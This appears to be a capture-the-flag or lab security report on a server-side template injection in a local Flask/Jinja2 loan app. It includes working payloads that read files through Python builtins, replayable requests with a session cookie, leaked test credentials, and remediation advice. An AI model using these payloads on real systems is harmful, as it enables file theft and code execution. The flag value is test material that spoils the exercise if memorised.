## TL;DR
- Objective: Discover and exploit how JSON objects are built using Jinja templates
- Outcome: **ACHIEVED** - Successfully identified and exploited Server-Side Template Injection (SSTI)
- Highest-impact finding: Critical SSTI vulnerability allowing arbitrary file read and code execution
- Validation status: **Confirmed** - Flag extracted: `FLAG{2bd640e5df35c3c7eae70068e9159d39649290c9b9344f10f47e9496604f8dd8}`

## Target Information
- Target: 127.0.0.1:33016
- Host / base URL: http://127.0.0.1:33016
- Application or component: Flask/Jinja2 web application (loan management system)
- Authentication context: Flask session-based authentication
  - Test credentials: `test:test` (found in HTML comment)
  - Session cookie: `session=eyJ1c2VyX2lkIjoxfQ.ac5gHA.Euw8HiuDnJ4yCUBfuJrDGWCt7io`
- Relevant technology details: 
  - Backend: Flask (Python web framework)
  - Template engine: Jinja2
  - Session management: Flask signed sessions

## Confirmed Vulnerability
### Server-Side Template Injection (SSTI) in Jinja2
- Affected endpoint / component: `/total_loan_payments` (JSON API endpoint)
- Impact: **Critical** - Arbitrary file read, potential remote code execution, access to Flask application config and secrets
- Preconditions: Valid authenticated session required
- Exact payload or PoC:
  - **Confirmation payload**: `{{7*7}}` (evaluates to `49`)
  - **File read payload**: `{{request.application.__globals__.__builtins__.open('/flag').read()}}`

## Steps to Reproduce
1. Navigate to `http://127.0.0.1:33016/` - redirects to `/login`
2. Extract test credentials from HTML source (found in HTML comment: `test:test`)
3. Authenticate with credentials `test:test` to obtain session cookie
4. Access the vulnerable JSON API endpoint at `/total_loan_payments`
5. Inject Jinja2 template expression in the `principal` parameter:
   ```
   GET /total_loan_payments?principal={{7*7}}&payment=212.47&term=60
   ```
6. Confirm SSTI by observing `"loan_principal": "49"` in response (7*7 evaluated)
7. Read arbitrary files using payload:
   ```
   GET /total_loan_payments?principal={{request.application.__globals__.__builtins__.open('/flag').read()}}
   ```

## Validation / Evidence
- Validation token / flag: `FLAG{2bd640e5df35c3c7eae70068e9159d39649290c9b9344f10f47e9496604f8dd8}`
- Tool evidence: HTTP requests to `/total_loan_payments` endpoint with crafted `principal` parameter

### Request evidence:
**SSTI Confirmation Request:**
```
GET /total_loan_payments?principal={{7*7}}&payment=212.47&term=60
Cookie: session=eyJ1c2VyX2lkIjoxfQ.ac5gHA.Euw8HiuDnJ4yCUBfuJrDGWCt7io
```

**FLAG Extraction Request:**
```
GET /total_loan_payments?principal={{request.application.__globals__.__builtins__.open('/flag').read()}}
Cookie: session=eyJ1c2VyX2lkIjoxfQ.ac5gHA.Euw8HiuDnJ4yCUBfuJrDGWCt7io
```

### Response evidence:
**SSTI Confirmation Response:**
```json
{ "loan_principal": "49" ...}
```
This proves the `principal` parameter is evaluated as Jinja2 template code.

**FLAG Extraction Response:**
```json
{ "loan_principal": "FLAG{2bd640e5df35c3c7eae70068e9159d39649290c9b9344f10f47e9496604f8dd8}" ...}
```

### Test credentials discovered:
```html
<!-- TODO: Delete the testing account (test:test). -->
```

- Notes on reliability / limitations: Requires authenticated session. The vulnerability is highly reliable as the `principal` parameter is directly interpolated into Jinja2 template strings without any sanitization.

## Remediation
- Root cause: The `/total_loan_payments` endpoint builds JSON objects by directly interpolating user-supplied `principal` parameter into Jinja2 template strings without sanitization or escaping. The application uses a pattern like:
  ```python
  template_string = '{"loan_principal": "{{principal}}", ...}'
  rendered = render_template_string(template_string, principal=user_input)
  ```
  This allows arbitrary Jinja2 expressions to be evaluated.

- Recommended fix:
  1. **Never interpolate user input into template strings**. Use proper template rendering with context variables:
     ```python
     # VULNERABLE - DO NOT USE
     template = f'{{"loan_principal": "{user_principal}"}}'
     
     # SAFE - Use JSON libraries
     import json
     response = json.dumps({"loan_principal": user_principal})
     
     # OR - Use Jinja2 auto-escaping with proper templates
     # In a .html template file (not string):
     # {"loan_principal": {{ principal|tojson }}}
     ```
  
  2. **Use `json.dumps()` for JSON responses** instead of building JSON via templates.
  
  3. **If templates are required**, use proper template files with auto-escaping enabled and pass data via context, never interpolate user input into template strings.

- Defense-in-depth:
  1. Implement input validation and sanitization for all user-supplied parameters
  2. Run Flask application with minimal privileges (cannot read sensitive files)
  3. Remove hardcoded test credentials from production code
  4. Implement Content Security Policy and input validation at WAF level
  5. Enable Flask's `TEMPLATES_AUTO_RELOAD = False` in production

## How to Verify the Fix
1. Attempt to inject Jinja2 expression in `principal` parameter:
   ```
   GET /total_loan_payments?principal={{7*7}}&payment=212.47&term=60
   ```
2. Expected secure result: Response should contain literal string `"loan_principal": "{{7*7}}"` or the value should be properly escaped, NOT the evaluated result `"49"`.
3. Attempt file read payload - should fail or return escaped literal string.
4. Verify no template expressions are evaluated in any parameter.

## Remaining Leads
- Confirmed blockers: None - full exploitation chain completed successfully
- Unverified leads: 
  - Potential for remote code execution beyond file read (not tested but likely possible via `__builtins__`)
  - Other endpoints may have similar SSTI vulnerabilities
  - Flask `SECRET_KEY` could potentially be extracted via `config` object for session forging
- Missing context: Full source code review would reveal if other endpoints use similar vulnerable patterns
